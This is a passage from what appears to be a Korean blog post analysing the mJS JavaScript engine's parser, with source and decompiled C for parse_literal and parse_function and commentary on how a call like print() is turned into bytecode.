</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ((res <span style="color:#f92672">=</span> <span style="color:#a6e22e">parse_literal</span>(p, <span style="color:#f92672">&amp;</span>p<span style="color:#f92672">-&gt;</span>tok)) <span style="color:#f92672">!=</span> MJS_OK) <span style="color:#66d9ef">return</span> res;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">while</span> (<span style="color:#a6e22e">findtok</span>(ops, p<span style="color:#f92672">-&gt;</span>tok.tok) <span style="color:#f92672">!=</span> TOK_EOF) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (p<span style="color:#f92672">-&gt;</span>tok.tok <span style="color:#f92672">==</span> TOK_OPEN_BRACKET) {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">int</span> prev_tok <span style="color:#f92672">=</span> p<span style="color:#f92672">-&gt;</span>prev_tok;
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">EXPECT</span>(p, TOK_OPEN_BRACKET);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ((res <span style="color:#f92672">=</span> <span style="color:#a6e22e">parse_expr</span>(p)) <span style="color:#f92672">!=</span> MJS_OK) <span style="color:#66d9ef">return</span> res;
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">emit_byte</span>(p, OP_SWAP);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">EXPECT</span>(p, TOK_CLOSE_BRACKET);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">findtok</span>(s_assign_ops, p<span style="color:#f92672">-&gt;</span>tok.tok) <span style="color:#f92672">&amp;&amp;</span>
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">!</span><span style="color:#a6e22e">findtok</span>(s_postfix_ops, p<span style="color:#f92672">-&gt;</span>tok.tok) <span style="color:#f92672">&amp;&amp;</span>
</span></span><span style="display:flex;"><span>          <span style="color:#75715e">/* TODO(dfrank): fix: it doesn&#39;t work for prefix ops */</span>
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">!</span><span style="color:#a6e22e">findtok</span>(s_postfix_ops, prev_tok)) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">emit_byte</span>(p, OP_GET);
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (p<span style="color:#f92672">-&gt;</span>tok.tok <span style="color:#f92672">==</span> TOK_OPEN_PAREN) {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">EXPECT</span>(p, TOK_OPEN_PAREN);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">emit_byte</span>(p, OP_ARGS);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">while</span> (p<span style="color:#f92672">-&gt;</span>tok.tok <span style="color:#f92672">!=</span> TOK_CLOSE_PAREN) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ((res <span style="color:#f92672">=</span> <span style="color:#a6e22e">parse_expr</span>(p)) <span style="color:#f92672">!=</span> MJS_OK) <span style="color:#66d9ef">return</span> res;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (p<span style="color:#f92672">-&gt;</span>tok.tok <span style="color:#f92672">==</span> TOK_COMMA) <span style="color:#a6e22e">pnext1</span>(p);
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">emit_byte</span>(p, OP_CALL);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">EXPECT</span>(p, TOK_CLOSE_PAREN);
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (p<span style="color:#f92672">-&gt;</span>tok.tok <span style="color:#f92672">==</span> TOK_DOT) {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">EXPECT</span>(p, TOK_DOT);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ((res <span style="color:#f92672">=</span> <span style="color:#a6e22e">parse_call_dot_mem</span>(p, TOK_DOT)) <span style="color:#f92672">!=</span> MJS_OK) <span style="color:#66d9ef">return</span> res;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  (<span style="color:#66d9ef">void</span>) prev_op;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> res;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>()를 구분해서 arg도 잘 넣어준다.
parse_literal을 통해서 문자열을 읽는다.
js 코드에서 mjs_print를 호출하려고 print()를 호출하면, 문자열 print는 parse_literal 함수에서 파싱된다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>mjs_err <span style="color:#66d9ef">__cdecl</span> <span style="color:#a6e22e">parse_literal</span>(pstate <span style="color:#f92672">*</span>p, <span style="color:#66d9ef">const</span> tok <span style="color:#f92672">*</span>t)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint8_t</span> v2; <span style="color:#75715e">// al
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__m128d</span> v3; <span style="color:#75715e">// xmm1
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">enum</span> mjs_OPCODE v5; <span style="color:#75715e">// [rsp+Ch] [rbp-54h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">size_t</span> oldlen; <span style="color:#75715e">// [rsp+10h] [rbp-50h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> uv; <span style="color:#75715e">// [rsp+18h] [rbp-48h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">double</span> d; <span style="color:#75715e">// [rsp+20h] [rbp-40h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">double</span> iv; <span style="color:#75715e">// [rsp+28h] [rbp-38h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> next_tok; <span style="color:#75715e">// [rsp+30h] [rbp-30h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> prev_tok; <span style="color:#75715e">// [rsp+34h] [rbp-2Ch]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> tok; <span style="color:#75715e">// [rsp+38h] [rbp-28h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  mjs_err res; <span style="color:#75715e">// [rsp+3Ch] [rbp-24h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  mbuf <span style="color:#f92672">*</span>bcode_gen; <span style="color:#75715e">// [rsp+40h] [rbp-20h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">const</span> tok <span style="color:#f92672">*</span>ta; <span style="color:#75715e">// [rsp+48h] [rbp-18h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  pstate <span style="color:#f92672">*</span>pa; <span style="color:#75715e">// [rsp+50h] [rbp-10h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  pa <span style="color:#f92672">=</span> p;
</span></span><span style="display:flex;"><span>  ta <span style="color:#f92672">=</span> t;
</span></span><span style="display:flex;"><span>  bcode_gen <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>p<span style="color:#f92672">-&gt;</span>mjs<span style="color:#f92672">-&gt;</span>bcode_gen;
</span></span><span style="display:flex;"><span>  res <span style="color:#f92672">=</span> MJS_OK;
</span></span><span style="display:flex;"><span>  tok <span style="color:#f92672">=</span> t<span style="color:#f92672">-&gt;</span>tok;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">cs_log_print_prefix</span>(LL_VERBOSE_DEBUG, <span style="color:#e6db74">&#34;src/mjs_parser.c&#34;</span>, <span style="color:#ae81ff">276</span>) )
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">cs_log_printf</span>(<span style="color:#e6db74">&#34;[%.*s] %p&#34;</span>, pa<span style="color:#f92672">-&gt;</span>tok.len, pa<span style="color:#f92672">-&gt;</span>tok.ptr, <span style="color:#f92672">&amp;</span>ta);
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>(_DWORD <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>v5 <span style="color:#f92672">=</span> ta<span style="color:#f92672">-&gt;</span>tok;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( ta<span style="color:#f92672">-&gt;</span>tok <span style="color:#f92672">==</span> TOK_ASSIGN )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    res <span style="color:#f92672">=</span> <span style="color:#a6e22e">parse_object_literal</span>(pa);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">switch</span> ( <span style="color:#f92672">*</span>(_DWORD <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>v5 )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">8</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">cs_log_print_prefix</span>(LL_VERBOSE_DEBUG, <span style="color:#e6db74">&#34;src/mjs_parser.c&#34;</span>, <span style="color:#ae81ff">331</span>) )
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">cs_log_printf</span>(<span style="color:#e6db74">&#34;  PNEXT %d&#34;</span>, <span style="color:#ae81ff">331LL</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">pnext</span>(pa);
</span></span><span style="display:flex;"><span>        res <span style="color:#f92672">=</span> <span style="color:#a6e22e">parse_expr</span>(pa);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( pa<span style="color:#f92672">-&gt;</span>tok.tok <span style="color:#f92672">!=</span> TOK_OPEN_PAREN )
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">goto</span> LABEL_39;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0xA</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        res <span style="color:#f92672">=</span> <span style="color:#a6e22e">parse_array_literal</span>(pa);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0xC8</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        d <span style="color:#f92672">=</span> <span style="color:#a6e22e">strtod</span>(ta<span style="color:#f92672">-&gt;</span>ptr, <span style="color:#ae81ff">0LL</span>);
</span></span><span style="display:flex;"><span>        uv <span style="color:#f92672">=</span> <span style="color:#a6e22e">strtoul</span>(ta<span style="color:#f92672">-&gt;</span>ptr <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">0LL</span>, <span style="color:#ae81ff">16</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">*</span>ta<span style="color:#f92672">-&gt;</span>ptr <span style="color:#f92672">==</span> <span style="color:#ae81ff">48</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">*</span>((_BYTE <span style="color:#f92672">*</span>)ta<span style="color:#f92672">-&gt;</span>ptr <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">120</span> )
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>          v3 <span style="color:#f92672">=</span> <span style="color:#a6e22e">_mm_sub_pd</span>(
</span></span><span style="display:flex;"><span>                 (<span style="color:#66d9ef">__m128d</span>)<span style="color:#a6e22e">_mm_unpacklo_epi32</span>(<span style="color:#a6e22e">_mm_loadl_epi64</span>((<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">__m128i</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>uv), (<span style="color:#66d9ef">__m128i</span>)xmmword_24020),
</span></span><span style="display:flex;"><span>                 (<span style="color:#66d9ef">__m128d</span>)xmmword_24030);
</span></span><span style="display:flex;"><span>          d <span style="color:#f92672">=</span> <span style="color:#a6e22e">_mm_unpackhi_pd</span>(v3, v3).m128d_f64[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">+</span> v3.m128d_f64[<span style="color:#ae81ff">0</span>];
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">modf</span>(d, <span style="color:#f92672">&amp;</span>iv) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0.0</span> )
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">emit_byte</span>(pa, <span style="color:#ae81ff">0xEu</span>);
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">emit_int</span>(pa, (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)(<span style="color:#66d9ef">int</span>)d);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">emit_byte</span>(pa, <span style="color:#ae81ff">0xFu</span>);
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">emit_str</span>(pa, ta<span style="color:#f92672">-&gt;</span>ptr, ta<span style="color:#f92672">-&gt;</span>len);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0xC9</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">emit_byte</span>(pa, <span style="color:#ae81ff">0xBu</span>);
</span></span><span style="display:flex;"><span>        oldlen <span style="color:#f92672">=</span> bcode_gen<span style="color:#f92672">-&gt;</span>len;
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">embed_string</span>(bcode_gen, pa<span style="color:#f92672">-&gt;</span>cur_idx, ta<span style="color:#f92672">-&gt;</span>ptr, ta<span style="color:#f92672">-&gt;</span>len, <span style="color:#ae81ff">2u</span>);
</span></span><span style="display:flex;"><span>        pa<span style="color:#f92672">-&gt;</span>cur_idx <span style="color:#f92672">+=</span> <span style="color:#a6e22e">LODWORD</span>(bcode_gen<span style="color:#f92672">-&gt;</span>len) <span style="color:#f92672">-</span> oldlen;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0xCA</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        prev_tok <span style="color:#f92672">=</span> pa<span style="color:#f92672">-&gt;</span>prev_tok;
</span></span><span style="display:flex;"><span>        next_tok <span style="color:#f92672">=</span> <span style="color:#a6e22e">ptest</span>(pa);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">emit_byte</span>(pa, <span style="color:#ae81ff">0xBu</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">emit_str</span>(pa, ta<span style="color:#f92672">-&gt;</span>ptr, ta<span style="color:#f92672">-&gt;</span>len);
</span></span><span style="display:flex;"><span>        v2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">9</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( prev_tok <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x14</span> )
</span></span><span style="display:flex;"><span>          v2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">emit_byte</span>(pa, v2);                      <span style="color:#75715e">// PUSH STR
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span><span style="color:#a6e22e">findtok</span>(<span style="color:#f92672">&amp;</span>s_assign_ops, next_tok)
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span><span style="color:#a6e22e">findtok</span>(<span style="color:#f92672">&amp;</span>s_postfix_ops, next_tok)
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span><span style="color:#a6e22e">findtok</span>(<span style="color:#f92672">&amp;</span>s_postfix_ops, prev_tok) )<span style="color:#75715e">// ++, --
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        {
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">emit_byte</span>(pa, <span style="color:#ae81ff">0x16u</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0xD4</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">emit_byte</span>(pa, <span style="color:#ae81ff">0xDu</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0xD7</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        res <span style="color:#f92672">=</span> <span style="color:#a6e22e">parse_function</span>(pa);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0xDC</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">emit_byte</span>(pa, <span style="color:#ae81ff">0x10u</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0xDF</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">emit_byte</span>(pa, <span style="color:#ae81ff">0x15u</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0xE1</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">emit_byte</span>(pa, <span style="color:#ae81ff">0xCu</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0xE9</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">emit_byte</span>(pa, <span style="color:#ae81ff">0x11u</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">default</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>LABEL_39:
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">mjs_set_errorf</span>(
</span></span><span style="display:flex;"><span>          pa<span style="color:#f92672">-&gt;</span>mjs,
</span></span><span style="display:flex;"><span>          MJS_SYNTAX_ERROR,
</span></span><span style="display:flex;"><span>          <span style="color:#e6db74">&#34;parse error at line %d: [%.*s]&#34;</span>,
</span></span><span style="display:flex;"><span>          (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)pa<span style="color:#f92672">-&gt;</span>line_no,
</span></span><span style="display:flex;"><span>          <span style="color:#ae81ff">10LL</span>,
</span></span><span style="display:flex;"><span>          pa<span style="color:#f92672">-&gt;</span>tok.ptr);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( tok <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0xD7</span> )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">cs_log_print_prefix</span>(LL_VERBOSE_DEBUG, <span style="color:#e6db74">&#34;src/mjs_parser.c&#34;</span>, <span style="color:#ae81ff">344</span>) )
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">cs_log_printf</span>(<span style="color:#e6db74">&#34;  PNEXT %d&#34;</span>, <span style="color:#ae81ff">344LL</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">pnext</span>(pa);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> res;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>여기서 주목할건 parse_function이다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">mjs_err_t</span> <span style="color:#a6e22e">parse_function</span>(<span style="color:#66d9ef">struct</span> pstate <span style="color:#f92672">*</span>p) {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">size_t</span> prologue, off;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> arg_no <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> name_provided <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">mjs_err_t</span> res <span style="color:#f92672">=</span> MJS_OK;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">EXPECT</span>(p, TOK_KEYWORD_FUNCTION);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (p<span style="color:#f92672">-&gt;</span>tok.tok <span style="color:#f92672">==</span> TOK_IDENT) {
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* Function name was provided */</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> tok tmp <span style="color:#f92672">=</span> p<span style="color:#f92672">-&gt;</span>tok;
</span></span><span style="display:flex;"><span>    name_provided <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">emit_byte</span>(p, OP_PUSH_STR);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">emit_str</span>(p, tmp.ptr, tmp.len);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">emit_byte</span>(p, OP_PUSH_SCOPE);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">emit_byte</span>(p, OP_CREATE);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">emit_byte</span>(p, OP_PUSH_STR);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">emit_str</span>(p, tmp.ptr, tmp.len);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">emit_byte</span>(p, OP_FIND_SCOPE);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">pnext1</span>(p);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">emit_byte</span>(p, OP_JMP);
</span></span><span style="display:flex;"><span>  off <span style="color:#f92672">=</span> p<span style="color:#f92672">-&gt;</span>cur_idx;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">emit_init_offset</span>(p);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  prologue <span style="color:#f92672">=</span> p<span style="color:#f92672">-&gt;</span>cur_idx;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">EXPECT</span>(p, TOK_OPEN_PAREN);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">emit_byte</span>(p, OP_NEW_SCOPE);
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Emit names of function arguments
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">while</span> (p<span style="color:#f92672">-&gt;</span>tok.tok <span style="color:#f92672">!=</span> TOK_CLOSE_PAREN) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (p<span style="color:#f92672">-&gt;</span>tok.tok <span style="color:#f92672">!=</span> TOK_IDENT) <span style="color:#a6e22e">SYNTAX_ERROR</span>(p);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">emit_byte</span>(p, OP_SET_ARG);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">emit_int</span>(p, arg_no);
</span></span><span style="display:flex;"><span>    arg_no<span style="color:#f92672">++</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">emit_str</span>(p, p<span style="color:#f92672">-&gt;</span>tok.ptr, p<span style="color:#f92672">-&gt;</span>tok.len);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">ptest</span>(p) <span style="color:#f92672">==</span> TOK_COMMA) <span style="color:#a6e22e">pnext1</span>(p);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">pnext1</span>(p);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">EXPECT</span>(p, TOK_CLOSE_PAREN);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ((res <span style="color:#f92672">=</span> <span style="color:#a6e22e">parse_block</span>(p, <span style="color:#ae81ff">0</span>)) <span style="color:#f92672">!=</span> MJS_OK) <span style="color:#66d9ef">return</span> res;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">emit_byte</span>(p, OP_RETURN);
</span></span><span style="display:flex;"><span>  prologue <span style="color:#f92672">+=</span> <span style="color:#a6e22e">mjs_bcode_insert_offset</span>(p, p<span style="color:#f92672">-&gt;</span>mjs, off,
</span></span><span style="display:flex;"><span>                                      p<span style="color:#f92672">-&gt;</span>cur_idx <span style="color:#f92672">-</span> off <span style="color:#f92672">-</span> MJS_INIT_OFFSET_SIZE);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">emit_byte</span>(p, OP_PUSH_FUNC);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">emit_int</span>(p, p<span style="color:#f92672">-&gt;</span>cur_idx <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span> <span style="color:#75715e">/* OP_PUSH_FUNC */</span> <span style="color:#f92672">-</span> prologue);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (name_provided) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">emit_op</span>(p, TOK_ASSIGN);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> res;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>소스코드로 보면 명확하게 보인다.
tok는 ident로 들어가기 때문에, 결국 print 문자열을 그대로 집어넣게 된다.</p>
<p>js가 인터프리터 언어라서 그런지 예상했던대로 그대로 문자열을 넣는다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>  res <span style="color:#f92672">=</span> <span style="color:#a6e22e">parse_statement_list</span>(<span style="color:#f92672">&amp;</span>p, <span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">emit_byte</span>(<span style="color:#f92672">&amp;</span>p, <span style="color:#ae81ff">0x23u</span>);                         <span style="color:#75715e">// OP_EXIT
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#f92672">*</span>(_DWORD <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>p.mjs<span style="color:#f92672">-&gt;</span>bcode_gen.buf[start_idx <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>] <span style="color:#f92672">=</span> p.mjs<span style="color:#f92672">-&gt;</span>bcode_gen.len <span style="color:#f92672">-</span> start_idx;
</span></span><span style="display:flex;"><span>  map_len <span style="color:#f92672">=</span> p.offset_lineno_map.len;
</span></span><span style="display:flex;"><span>  llen <span style="color:#f92672">=</span> <span style="color:#a6e22e">cs_varint_llen</span>(<span style="color:#a6e22e">SLODWORD</span>(p.offset_lineno_map.len));
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">mbuf_resize</span>(<span style="color:#f92672">&amp;</span>p.mjs<span style="color:#f92672">-&gt;</span>bcode_gen, llen <span style="color:#f92672">+</span> p.mjs<span style="color:#f92672">-&gt;</span>bcode_gen.size);
